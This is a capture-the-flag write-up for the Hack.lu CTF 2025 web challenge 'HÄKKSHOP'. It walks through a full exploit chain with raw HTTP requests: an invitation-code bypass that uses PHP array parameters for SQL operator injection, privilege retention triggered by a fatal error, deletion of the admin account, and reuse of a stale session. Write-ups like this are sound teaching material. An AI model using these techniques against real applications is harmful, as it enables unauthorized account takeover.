---
title: CTF | HÄKKSHOP
description: Hack.lu CTF 2025
date: "2025-11-01"
tldr: Wrong check of invitation codes, elevating privileges by triggering an error in the middle a function, wrong session handling (missing session invalidation logic). 
draft: false
tags: [ctf,php,auth,session] 
toc: false
---


**CTF:** Hack.lu CTF 2025

**Challenge created by**: `pspaul`

**Category:** Web

**Points:** 121

**Goal:** Shop all the hacker things!

## Introduction

This CTF challenge requires us to gain access to a flag located at `/flag.php`. A preliminary review of the web application and its source code reveals that this page is only accessible to users with specific read permissions. The challenge involves bypassing several security measures, including the registration invitation code, manipulating user accounts, and escalating privileges to finally read the flag.

## Code Analysis and Goal Scoping

Our primary goal is to read the contents of `/flag.php`. The code for this page is straightforward:

```php
<?php
// src/flag.php

include_once 'inc/required.php';
include_once 'inc/perms.php';

enforce_auth();

include_once 'inc/header.php';

if (has_perms('flag_read')) {
    echo '<h2>Flag</h2>';
    echo '<p>Flag: <code>' . getenv('FLAG') . '</code></p>';
} else {
    echo '<h2>Flag</h2>';
    echo '<p>You do not have permission to view the flag.</p>';
}

include_once 'inc/footer.php';
```

From this, it's clear we need to be authenticated and have the `flag_read` permission. The administrator account, created during the installation process in `install.php`, is granted this permission. This implies our path to the flag involves gaining administrative privileges.

The registration process, handled by `register.php`, requires an invitation code. This is our first obstacle. Subsequently, we will need to find a way to escalate our privileges to match those of an administrator.

## The Path to the Flag: A Step-by-Step Walkthrough

### 1. Bypassing the Invitation Code

The registration form requires a valid invitation code. However, the validation logic is flawed and can be bypassed with a crafted request.

**Technical Explanation:**

The bypass involves overcoming two distinct checks in `register.php`. First, the script checks if the `code` parameter is a string: `is_string($_REQUEST['code'])`. Second, it validates the code using `is_valid_invite($_POST['code'])`.

Our payload cleverly separates the data used for each check. We send `code` both in the POST body as an array (`code[]=!=&code[]=`) and as a cookie (`Cookie: code`).

1.  **Passing the `is_string` check:** 

    Because a cookie is present, `$_REQUEST['code']` (which combines `$_POST`, `$_GET`, and `$_COOKIE`) is treated as a string, satisfying the `is_string` condition.

2.  **Bypassing the validation:**

    The subsequent call to `is_valid_invite` specifically uses `$_POST['code']`, which is our array `['!=', '']`. In `inc/db.php`, the `buildTerm` function sees this array and constructs a SQL `WHERE` clause like `code != ''`. Since the `invites` table is not empty, this query returns a result, making the function return `true` and bypassing the invitation code check.

Here is the request to register the user "mike":

```http
POST /register.php HTTP/1.1
Host: fdf8127bd15a8b51.xn--hkk-qla.shop
Cookie: code
Content-Length: 45
Content-Type: application/x-www-form-urlencoded

username=mike&password=pass&code[]=!=&code[]=
```

### 2. Logging In

After successfully registering, we log in to obtain a valid session cookie.

```http
POST /login.php HTTP/1.1
Content-Length: 27
Origin: https://d2d7ccd10da6c316.xn--hkk-qla.shop
Content-Type: application/x-www-form-urlencoded

username=mike&password=pass
```

Upon a successful login, the server sets a `PHPSESSID` cookie that is tied to our user account. It is important to note that if no session cookie is provided during the login request, a new one is issued. This will be crucial later.

### 3. Deleting the Admin Account

The settings page allows users to delete their own accounts. However, this functionality has a vulnerability that allows for privilege escalation.

**Technical Explanation:**

In `settings.php`, when a user deletes their own account, the application temporarily grants `users_delete` and `perms_delete` permissions to the session via `add_tmp_perms`. The script then attempts to display a success message using `show_success($_REQUEST['msg'])` before removing the temporary permissions and logging the user out.

We can exploit this by passing `msg` as an array in the URL (`msg[]=x`). The `show_success` function expects a string argument, but we are providing an array. This type mismatch causes a fatal error in the PHP script. The error halts execution immediately. As a result, the code that follows—`rm_tmp_perms(...)` and `header('Location: logout.php')`—is never executed. Our session is not destroyed, and it retains the elevated temporary permissions to delete other users.

First, we delete our own account (`uid = 2`) to trigger the error and gain the temporary permissions:

```http
POST /settings.php?uid=2&msg[]=x HTTP/1.1
Cookie: PHPSESSID=396f3535c2e9346a182df142fb49a46d
Content-Type: application/x-www-form-urlencoded
Content-Length: 14

delete-user=1
```

Now, with our session possessing delete permissions, we can delete the admin account (which has `uid = 1`):

```http
POST /settings.php?uid=1 HTTP/1.1
Cookie: PHPSESSID=396f3535c2e9346a182df142fb49a46d
Content-Type: application/x-www-form-urlencoded
Content-Length: 14

delete-user=1
```

### 4. Creating a New User on UID 1

With the original admin account deleted, the `uid = 1` is now available. When we register a new user, the database will assign the lowest available primary key, which is now 1. We'll register a new user named "fill".

```http
POST /register.php HTTP/1.1
Host: fdf8127bd15a8b51.xn--hkk-qla.shop
Cookie: code
Content-Length: 45
Content-Type: application/x-www-form-urlencoded

username=fill&password=pass&code[]=!=&code[]=
```

### 5. Creating a Valid Session for the New User on UID 1

Next, we need to create a valid session for our new user "fill", which now has `uid = 1`. We do this by logging in, making sure to *not* include any existing session cookie. This forces the server to issue a new, valid session for `uid = 1`.

```http
POST /login.php HTTP/1.1
Content-Length: 27
Origin: https://d2d7ccd10da6c316.xn--hkk-qla.shop
Content-Type: application/x-www-form-urlencoded

username=fill&password=pass
```

The response to this request will include a new `PHPSESSID` cookie. Let's call this session **eugene**. We'll save this session cookie for later.

### 6. Deleting the "fill" User on UID 1

We can now reuse our session from step 3, which still has the temporary delete permissions, to delete the "fill" user at `uid = 1`.

```http
POST /settings.php?uid=1 HTTP/1.1
Cookie: PHPSESSID=396f3535c2e9346a182df142fb49a46d
Content-Type: application/x-www-form-urlencoded
Content-Length: 14

delete-user=1
```

### 7. Recreating the Admin Account

By accessing `install.php`, we can trigger the installation script to run again. The script is designed to create an admin account if one does not already exist. Since we have deleted all users with `uid = 1`, the script will create a new admin account with `uid = 1`. We can use our session with delete rights for this step.

```http
GET /install.php HTTP/1.1
Cookie: PHPSESSID=396f3535c2e9346a182df142fb49a46d
```

### 8. Logging in as Admin and Capturing the Flag

Now, we can use the **eugene** session we saved in step 5. This session is associated with `uid = 1`. Since the admin account now occupies `uid = 1`, the **eugene** session will grant us access to the admin account. With administrative privileges, we can navigate to `/flag.php` to retrieve the flag.

## Conclusion: The Critical Flaws

The successful exploit of this application hinged on two key vulnerabilities:

1.  **Improper Error Handling leading to Privilege Escalation (Step 3):**
  
    The vulnerability in `settings.php` where temporary permissions are granted but not revoked is a critical flaw. By intentionally triggering a fatal error after gaining temporary permissions, an attacker can prevent the cleanup logic from running. This allows the attacker's session to retain elevated privileges indefinitely.

3.  **Session Fixation (Steps 4 and 8):**

    The application's session management is flawed. A session is tied to a user ID (`uid`) and is not invalidated when the user associated with that `uid` is deleted and replaced. This allows for a session fixation attack. We were able to create a user at a known `uid` (`uid = 1`), generate a valid session for that `uid`, and then replace the user at that `uid` with a privileged user (the admin). The previously generated session remained valid and was now associated with the new, privileged account, granting us unauthorized access.